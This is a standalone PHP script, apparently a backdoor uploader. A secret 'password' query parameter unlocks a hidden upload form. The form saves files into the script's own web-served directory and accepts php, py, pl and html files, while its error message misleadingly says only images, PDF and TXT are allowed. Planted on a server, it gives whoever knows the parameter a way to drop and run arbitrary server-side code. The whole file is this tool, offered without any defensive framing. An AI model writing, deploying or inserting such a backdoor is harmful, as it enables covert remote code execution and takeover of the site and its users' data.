<?php
if (isset($_GET['password']) && $_GET['password'] === "PASSWORD_HERE") {
    ?>
    <body style="background-color: black; color: green;">
        <h1>Upload a File</h1>
        <form action="" method="post" enctype="multipart/form-data">
            <label for="fileToUpload">Select file to upload:</label>
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload File" name="submit">
        </form>
    
    </body>


    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $target_dir = __DIR__ . "/";
        $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
        $uploadOk = 1;
        $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

        // Check if file is a real file
        if (isset($_POST["submit"])) {
            if (file_exists($_FILES["fileToUpload"]["tmp_name"])) {
                echo "File is a valid file.<br>";
            } else {
                echo "File is not valid.<br>";
                $uploadOk = 0;
            }
        }

        // Check if file already exists
        if (file_exists($target_file)) {
            echo "Sorry, file already exists.<br>";
            $uploadOk = 0;
        }

        // Check file size (limit to 5MB for example)
        if ($_FILES["fileToUpload"]["size"] > 5000000) {
            echo "Sorry, your file is too large.<br>";
            $uploadOk = 0;
        }

        // Allow certain file formats (optional)
        $allowedTypes = ['jpg', 'png', 'jpeg', 'gif', 'pdf', 'txt', 'py', 'php', 'html', 'pl'];
        if (!in_array($fileType, $allowedTypes)) {
            echo "Sorry, only JPG, JPEG, PNG, GIF, PDF, and TXT files are allowed.<br>";
            $uploadOk = 0;
        }

        // Check if $uploadOk is set to 0 by an error
        if ($uploadOk == 0) {
            echo "Sorry, your file was not uploaded.<br>";
        // if everything is ok, try to upload file
        } else {
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "The file ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.<br>";
            } else {
                echo "Sorry, there was an error uploading your file.<br>";
            }
        }
    }
}
?>
